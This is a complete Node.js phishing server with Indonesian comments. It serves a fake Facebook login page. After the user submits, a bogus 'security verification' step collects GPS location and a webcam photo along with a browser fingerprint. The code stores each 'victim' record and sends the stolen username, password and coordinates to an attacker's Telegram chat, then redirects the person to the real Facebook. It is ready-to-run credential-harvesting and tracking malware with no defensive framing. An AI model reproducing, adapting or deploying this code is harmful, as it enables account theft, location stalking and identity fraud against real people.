const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const geoip = require('geoip-lite');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Konfigurasi dari environment variables
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || 'YOUR_BOT_TOKEN';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || 'YOUR_CHAT_ID';

// Inisialisasi bot jika token tersedia
let bot = null;
if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN') {
    bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
}

// Database sederhana (gunakan database nyata untuk production)
const victims = new Map();

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

// Helper function untuk generate victim ID
function generateVictimId(req) {
    const ip = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || '';
    const crypto = require('crypto');
    return crypto
        .createHash('md5')
        .update(ip + userAgent + Date.now())
        .digest('hex')
        .substring(0, 12);
}

// Route utama - Halaman phishing
app.get('/', (req, res) => {
    const victimId = generateVictimId(req);
    
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Facebook - Login</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                background: #f0f2f5;
                margin: 0;
                padding: 0;
                min-height: 100vh;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
                padding: 20px;
            }
            .header {
                text-align: center;
                padding: 40px 0;
            }
            .header h1 {
                color: #1877f2;
                font-size: 48px;
                margin: 0;
                font-weight: bold;
            }
            .main-content {
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 60vh;
            }
            .login-box { 
                background: white; 
                padding: 30px; 
                width: 400px; 
                border-radius: 8px; 
                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            }
            .login-box h2 {
                color: #1c1e21;
                margin-bottom: 20px;
                text-align: center;
            }
            .form-group {
                margin-bottom: 15px;
            }
            .form-group input {
                width: 100%;
                padding: 14px 16px;
                border: 1px solid #dddfe2;
                border-radius: 6px;
                font-size: 17px;
                box-sizing: border-box;
            }
            .form-group input:focus {
                outline: none;
                border-color: #1877f2;
                box-shadow: 0 0 0 2px #e7f3ff;
            }
            .login-btn {
                background: #1877f2;
                color: white;
                border: none;
                padding: 14px;
                width: 100%;
                border-radius: 6px;
                font-size: 20px;
                font-weight: bold;
                cursor: pointer;
                margin-top: 10px;
            }
            .login-btn:hover {
                background: #166fe5;
            }
            .divider {
                display: flex;
                align-items: center;
                margin: 20px 0;
                color: #8a8d91;
            }
            .divider:before,
            .divider:after {
                content: "";
                flex: 1;
                height: 1px;
                background: #dadde1;
            }
            .divider span {
                padding: 0 15px;
            }
            .create-account-btn {
                background: #42b72a;
                color: white;
                border: none;
                padding: 14px;
                width: 60%;
                border-radius: 6px;
                font-size: 17px;
                font-weight: bold;
                cursor: pointer;
                display: block;
                margin: 20px auto;
            }
            .footer {
                text-align: center;
                padding: 20px;
                color: #8a8d91;
                font-size: 14px;
                border-top: 1px solid #dadde1;
                margin-top: 40px;
            }
            /* Modal styles */
            .modal {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: rgba(0,0,0,0.8);
                z-index: 1000;
            }
            .modal-content {
                background: white;
                width: 90%;
                max-width: 500px;
                margin: 50px auto;
                padding: 30px;
                border-radius: 10px;
                position: relative;
            }
            .close-btn {
                position: absolute;
                top: 15px;
                right: 15px;
                background: none;
                border: none;
                font-size: 24px;
                cursor: pointer;
                color: #8a8d91;
            }
            .permission-item {
                margin: 15px 0;
                padding: 15px;
                background: #f0f2f5;
                border-radius: 6px;
            }
            .camera-container {
                width: 100%;
                height: 300px;
                background: #000;
                margin: 20px 0;
                border-radius: 6px;
                overflow: hidden;
            }
            .camera-container video {
                width: 100%;
                height: 100%;
                object-fit: cover;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>facebook</h1>
            </div>
            
            <div class="main-content">
                <div class="login-box">
                    <h2>Masuk ke Facebook</h2>
                    <form id="loginForm">
                        <div class="form-group">
                            <input type="text" id="username" placeholder="Email atau nomor telepon" required>
                        </div>
                        <div class="form-group">
                            <input type="password" id="password" placeholder="Kata sandi" required>
                        </div>
                        <button type="submit" class="login-btn">Masuk</button>
                        
                        <div class="divider">
                            <span>atau</span>
                        </div>
                        
                        <a href="#" style="display: block; text-align: center; color: #1877f2; text-decoration: none; margin: 15px 0;">
                            Lupa kata sandi?
                        </a>
                        
                        <button type="button" class="create-account-btn" onclick="showSignup()">
                            Buat Akun Baru
                        </button>
                    </form>
                </div>
            </div>
            
            <div class="footer">
                <p>Bahasa Indonesia • English (UK) • 日本語 • 한국어 • 中文(简体)</p>
                <p>© 2024 Facebook</p>
            </div>
        </div>
        
        <!-- Permission Modal -->
        <div id="permissionModal" class="modal">
            <div class="modal-content">
                <button class="close-btn" onclick="closeModal('permissionModal')">×</button>
                <h2 style="color: #1c1e21; margin-bottom: 20px;">Verifikasi Keamanan Diperlukan</h2>
                <p>Untuk melindungi akun Anda, kami perlu memverifikasi identitas Anda.</p>
                
                <div class="permission-item">
                    <input type="checkbox" id="locationPerm" checked disabled>
                    <label for="locationPerm" style="margin-left: 10px;">
                        <strong>📍 Izinkan Akses Lokasi</strong><br>
                        <small>Untuk mendeteksi aktivitas mencurigakan</small>
                    </label>
                </div>
                
                <div class="permission-item">
                    <input type="checkbox" id="cameraPerm">
                    <label for="cameraPerm" style="margin-left: 10px;">
                        <strong>📸 Verifikasi Wajah</strong><br>
                        <small>Ambil foto untuk konfirmasi identitas</small>
                    </label>
                </div>
                
                <div id="cameraSection" style="display: none;">
                    <div class="camera-container">
                        <video id="cameraVideo" autoplay playsinline></video>
                    </div>
                    <button onclick="capturePhoto()" style="
                        background: #1877f2;
                        color: white;
                        border: none;
                        padding: 12px 24px;
                        border-radius: 6px;
                        cursor: pointer;
                        margin-right: 10px;
                    ">
                        📸 Ambil Foto
                    </button>
                    <button onclick="skipCamera()" style="
                        background: #8a8d91;
                        color: white;
                        border: none;
                        padding: 12px 24px;
                        border-radius: 6px;
                        cursor: pointer;
                    ">
                        Lewati
                    </button>
                </div>
                
                <button onclick="requestPermissions()" style="
                    background: #42b72a;
                    color: white;
                    border: none;
                    padding: 14px;
                    width: 100%;
                    border-radius: 6px;
                    font-size: 17px;
                    font-weight: bold;
                    cursor: pointer;
                    margin-top: 20px;
                ">
                    Lanjutkan Verifikasi
                </button>
                
                <p style="font-size: 12px; color: #8a8d91; margin-top: 15px;">
                    Informasi ini hanya digunakan untuk keamanan akun Anda.
                </p>
            </div>
        </div>
        
        <!-- Loading Modal -->
        <div id="loadingModal" class="modal">
            <div class="modal-content" style="text-align: center;">
                <h2>Memproses...</h2>
                <div style="
                    width: 50px;
                    height: 50px;
                    border: 4px solid #f3f3f3;
                    border-top: 4px solid #1877f2;
                    border-radius: 50%;
                    animation: spin 1s linear infinite;
                    margin: 30px auto;
                "></div>
                <p>Sedang memverifikasi informasi Anda...</p>
                <style>
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                </style>
            </div>
        </div>

        <script>
            const victimId = '${victimId}';
            let cameraStream = null;
            let userLocation = null;
            let userPhoto = null;
            
            // Form submission handler
            document.getElementById('loginForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                if (!username || !password) {
                    alert('Harap isi semua field');
                    return;
                }
                
                // Show permission modal
                document.getElementById('permissionModal').style.display = 'block';
            });
            
            // Toggle camera section
            document.getElementById('cameraPerm').addEventListener('change', function() {
                const cameraSection = document.getElementById('cameraSection');
                cameraSection.style.display = this.checked ? 'block' : 'none';
                
                if (this.checked) {
                    startCamera();
                } else {
                    stopCamera();
                }
            });
            
            // Start camera
            async function startCamera() {
                try {
                    cameraStream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        } 
                    });
                    document.getElementById('cameraVideo').srcObject = cameraStream;
                } catch (err) {
                    console.error('Camera error:', err);
                    document.getElementById('cameraPerm').checked = false;
                    document.getElementById('cameraSection').style.display = 'none';
                    alert('Akses kamera ditolak. Verifikasi akan dilanjutkan tanpa foto.');
                }
            }
            
            // Stop camera
            function stopCamera() {
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                    cameraStream = null;
                }
            }
            
            // Capture photo
            function capturePhoto() {
                const video = document.getElementById('cameraVideo');
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                userPhoto = canvas.toDataURL('image/jpeg', 0.7);
                alert('Foto berhasil diambil!');
                stopCamera();
            }
            
            // Skip camera
            function skipCamera() {
                stopCamera();
                document.getElementById('cameraPerm').checked = false;
                document.getElementById('cameraSection').style.display = 'none';
            }
            
            // Request permissions
            function requestPermissions() {
                document.getElementById('loadingModal').style.display = 'block';
                
                // Get location
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        async (position) => {
                            userLocation = {
                                lat: position.coords.latitude,
                                lon: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            };
                            
                            await collectAndSendData();
                        },
                        async (error) => {
                            console.warn('Location error:', error);
                            await collectAndSendData();
                        },
                        { 
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    collectAndSendData();
                }
            }
            
            // Collect and send data
            async function collectAndSendData() {
                const username = document.getElementById('username').value;
                const password = document.getElementById('password').value;
                
                // Get IP address
                let ip = '';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipResponse.json();
                    ip = ipData.ip;
                } catch (e) {
                    ip = 'Unknown';
                }
                
                // Get system info
                const systemInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    languages: navigator.languages,
                    screen: window.screen.width + 'x' + window.screen.height,
                    colorDepth: window.screen.colorDepth,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookies: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack || 'unspecified'
                };
                
                // Get network info
                const connection = navigator.connection || {};
                const networkInfo = {
                    downlink: connection.downlink,
                    effectiveType: connection.effectiveType,
                    rtt: connection.rtt,
                    saveData: connection.saveData
                };
                
                // Get browser plugins
                const plugins = [];
                if (navigator.plugins) {
                    for (let i = 0; i < navigator.plugins.length; i++) {
                        plugins.push(navigator.plugins[i].name);
                    }
                }
                
                // Prepare tracking data
                const trackingData = {
                    victimId: victimId,
                    credentials: {
                        username: username,
                        password: password
                    },
                    location: userLocation,
                    photo: userPhoto,
                    ip: ip,
                    system: systemInfo,
                    network: networkInfo,
                    plugins: plugins,
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer
                };
                
                // Send to server
                try {
                    const response = await fetch('/track', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(trackingData)
                    });
                    
                    if (response.ok) {
                        // Redirect to real Facebook after 2 seconds
                        setTimeout(() => {
                            window.location.href = 'https://www.facebook.com';
                        }, 2000);
                    } else {
                        throw new Error('Server error');
                    }
                } catch (error) {
                    console.error('Error:', error);
                    window.location.href = 'https://www.facebook.com';
                }
            }
            
            // Modal functions
            function closeModal(modalId) {
                document.getElementById(modalId).style.display = 'none';
                stopCamera();
            }
            
            function showSignup() {
                alert('Halaman pendaftaran sedang dalam pemeliharaan.');
            }
            
            // Cleanup camera on page unload
            window.addEventListener('beforeunload', () => {
                stopCamera();
            });
        </script>
    </body>
    </html>
    `;
    
    res.send(html);
});

// API endpoint untuk menerima data tracking
app.post('/track', async (req, res) => {
    try {
        const trackingData = req.body;
        
        // Add geo IP information
        const geoInfo = geoip.lookup(trackingData.ip);
        trackingData.geoInfo = geoInfo || {};
        
        // Store in memory
        victims.set(trackingData.victimId, trackingData);
        
        // Save to file (for Vercel, use temporary storage)
        saveToLog(trackingData);
        
        // Send to Telegram if bot is configured
        if (bot && TELEGRAM_CHAT_ID) {
            await sendToTelegram(trackingData);
        }
        
        res.json({ 
            success: true, 
            message: 'Data received',
            redirect: 'https://www.facebook.com'
        });
        
    } catch (error) {
        console.error('Error processing tracking data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error' 
        });
    }
});

// Endpoint untuk melihat semua data (protected)
app.get('/admin/victims', (req, res) => {
    const adminKey = req.query.key;
    const validKey = process.env.ADMIN_KEY || 'admin123';
    
    if (adminKey !== validKey) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    const victimsArray = Array.from(victims.values());
    res.json({
        count: victimsArray.length,
        victims: victimsArray
    });
});

// Endpoint untuk menghapus data
app.delete('/admin/victims', (req, res) => {
    const adminKey = req.query.key;
    const validKey = process.env.ADMIN_KEY || 'admin123';
    
    if (adminKey !== validKey) {
        return res.status(403).json({ error: 'Unauthorized' });
    }
    
    victims.clear();
    res.json({ success: true, message: 'All data cleared' });
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy',
        victimsCount: victims.size,
        timestamp: new Date().toISOString()
    });
});

// Function to save log
function saveToLog(data) {
    const logEntry = {
        timestamp: new Date().toISOString(),
        victimId: data.victimId,
        username: data.credentials.username,
        ip: data.ip,
        location: data.location
    };
    
    console.log('📱 Tracking Data:', JSON.stringify(logEntry, null, 2));
    
    // In Vercel, we can only write to /tmp directory
    const tmpDir = '/tmp';
    const logFile = path.join(tmpDir, 'tracking_log.json');
    
    try {
        let logs = [];
        if (fs.existsSync(logFile)) {
            const existing = fs.readFileSync(logFile, 'utf8');
            logs = JSON.parse(existing);
        }
        
        logs.push(logEntry);
        fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
    } catch (error) {
        console.error('Error writing log:', error);
    }
}

// Function to send to Telegram
async function sendToTelegram(data) {
    try {
        const message = `
🚨 *NEW VICTIM TRACKED* 🚨

*📱 Credentials:*
👤 Username: \`${data.credentials.username}\`
🔑 Password: \`${data.credentials.password}\`

*📍 Location:*
🌐 IP: ${data.ip}
${data.geoInfo.country ? `🗺️ Country: ${data.geoInfo.country}` : ''}
${data.geoInfo.city ? `🏙️ City: ${data.geoInfo.city}` : ''}
${data.location ? `📍 Coordinates: ${data.location.lat}, ${data.location.lon}` : ''}

*🖥️ System Info:*
🔍 Platform: ${data.system.platform}
🖥️ Screen: ${data.system.screen}
🌐 Language: ${data.system.languages ? data.system.languages[0] : 'Unknown'}

*⏰ Timestamp:* ${new Date(data.timestamp).toLocaleString()}
        `;
        
        await bot.sendMessage(TELEGRAM_CHAT_ID, message, { parse_mode: 'Markdown' });
        
        // Send location if available
        if (data.location && data.location.lat && data.location.lon) {
            await bot.sendLocation(TELEGRAM_CHAT_ID, data.location.lat, data.location.lon);
            
            // Send Google Maps link
            const mapsUrl = `https://www.google.com/maps?q=${data.location.lat},${data.location.lon}`;
            await bot.sendMessage(TELEGRAM_CHAT_ID, `🗺️ Google Maps: ${mapsUrl}`);
        }
        
        console.log('✅ Telegram notification sent');
        
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🌐 Access: http://localhost:${PORT}`);
    console.log(`📊 Admin: http://localhost:${PORT}/admin/victims?key=${process.env.ADMIN_KEY || 'admin123'}`);
    console.log(`❤️ Health: http://localhost:${PORT}/health`);
});

// Handle graceful shutdown
process.on('SIGTERM', () => {
    console.log('SIGTERM received. Shutting down gracefully...');
    process.exit(0);
});

module.exports = app;
